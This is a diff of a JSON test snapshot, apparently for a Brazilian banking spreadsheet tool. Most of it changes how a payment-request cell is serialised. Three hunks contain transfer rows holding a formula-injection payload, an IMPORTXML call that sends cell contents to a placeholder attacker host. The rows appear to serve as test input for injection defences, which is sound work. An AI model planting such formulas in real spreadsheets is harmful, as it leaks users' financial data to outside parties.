@@ -14,7 +14,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Extrato": [
     "9,1|t|sentinela A9",
@@ -107,7 +107,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Extrato": [
     "9,1|t|sentinela A9",
@@ -161,7 +161,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Transferência": [
     "9,1|t|sentinela A9",
@@ -266,7 +266,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Boleto": [
     "9,1|t|sentinela A9",
@@ -375,7 +375,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Pagamento Boleto": [
     "9,1|t|sentinela A9",
@@ -462,7 +462,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Invoices Emitidas": [
     "9,1|t|sentinela A9",
@@ -606,7 +606,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Aprovações": [
     "9,1|t|sentinela A9",
@@ -775,7 +775,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Aprovações": [
     "9,1|t|sentinela A9",
@@ -835,7 +835,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Aprovações": [
     "9,1|t|sentinela A9",
@@ -913,7 +913,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Clientes": [
     "9,1|t|sentinela A9",
@@ -1008,7 +1008,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Histórico de Boletos Emitidos": [
     "9,1|t|sentinela A9",
@@ -1181,7 +1181,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Histórico de Boletos Emitidos": [
     "9,1|t|sentinela A9",
@@ -1293,7 +1293,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Split Consultas": [
     "9,1|t|sentinela A9",
@@ -1383,7 +1383,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}",
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}",
     "2,1|t|Olá, myworkspace!",
     "3,1|t|Workspace: myworkspace",
     "4,1|t|ID do Workspace: 5",
@@ -1578,7 +1578,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\":[\"341000112345-6Jose da Silva012.345.678-90123456fornecedor,abrilPagamento abril\",\"20018183123498765Empresa C Ltda12.345.678/0001-901000\",\"00143211=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")987654321001a=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")\"],\"boleto\":[]}"
+    "1,3|t|j{\"transfer\":[\"341000112345-6Jose da Silva012.345.678-90123456fornecedor,abrilPagamento abril\",\"20018183123498765Empresa C Ltda12.345.678/0001-901000\",\"00143211=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")987654321001a=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")\"],\"boleto\":[]}"
    ],
    "Transferência com Aprovação": [
     "9,1|t|sentinela A9",
@@ -1713,7 +1713,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Transferência com Aprovação": [
     "9,1|t|sentinela A9",
@@ -1850,7 +1850,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\":[\"341000112345-6Jose da Silva012.345.678-90123456fornecedor,abrilPagamento abril\",\"20018183123498765Empresa C Ltda12.345.678/0001-901000\",\"00143211=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")987654321001a=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")\"],\"boleto\":[]}"
+    "1,3|t|j{\"transfer\":[\"341000112345-6Jose da Silva012.345.678-90123456fornecedor,abrilPagamento abril\",\"20018183123498765Empresa C Ltda12.345.678/0001-901000\",\"00143211=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")987654321001a=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")\"],\"boleto\":[]}"
    ],
    "Transferência com Aprovação": [
     "9,1|t|sentinela A9",
@@ -1989,7 +1989,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Transferência com Aprovação": [
     "9,1|t|sentinela A9",
@@ -2067,7 +2067,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\":[\"3410001123Jose da Silva12345678901000\"],\"boleto\":[]}"
+    "1,3|t|j{\"transfer\":[\"3410001123Jose da Silva12345678901000\"],\"boleto\":[]}"
    ],
    "Transferência com Aprovação": [
     "9,1|t|sentinela A9",
@@ -2143,7 +2143,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\":[],\"boleto\":[\"34191090086120772780871444640008591990000015000\",\"34191090086120772780871444640008591990000015\"]}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[\"34191090086120772780871444640008591990000015000\",\"34191090086120772780871444640008591990000015\"]}"
    ],
    "Pagamento de Boletos": [
     "9,1|t|sentinela A9",
@@ -2224,7 +2224,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Pagamento de Boletos": [
     "9,1|t|sentinela A9",
@@ -2306,7 +2306,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Pagamento de Boletos": [
     "9,1|t|sentinela A9",
@@ -2363,7 +2363,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\":[],\"boleto\":[\"34191090086120772780871444640008591990000015000\"]}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[\"34191090086120772780871444640008591990000015000\"]}"
    ],
    "Pagamento de Boletos": [
     "9,1|t|sentinela A9",
@@ -2432,7 +2432,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Emissão de Invoice Pix": [
     "9,1|t|sentinela A9",
@@ -2524,7 +2524,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Split Receivers": [
     "9,1|t|sentinela A9",
@@ -2604,7 +2604,7 @@
     "6,3|t|cart-1"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Solicitação de Cartões": [
     "9,1|t|sentinela A9",
@@ -2719,7 +2719,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Emissão de Boletos": [
     "9,1|t|sentinela A9",
@@ -2865,7 +2865,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Cadastro de Clientes": [
     "9,1|t|sentinela A9",
@@ -2950,7 +2950,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Chave PIX": [
     "9,1|t|sentinela A9",
@@ -3045,7 +3045,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Chave PIX": [
     "9,1|t|sentinela A9",
@@ -3134,7 +3134,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Transferência": [
     "10,1|t|Data de Criação",
@@ -3348,7 +3348,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Transferência": [
     "10,1|t|Data de Criação",
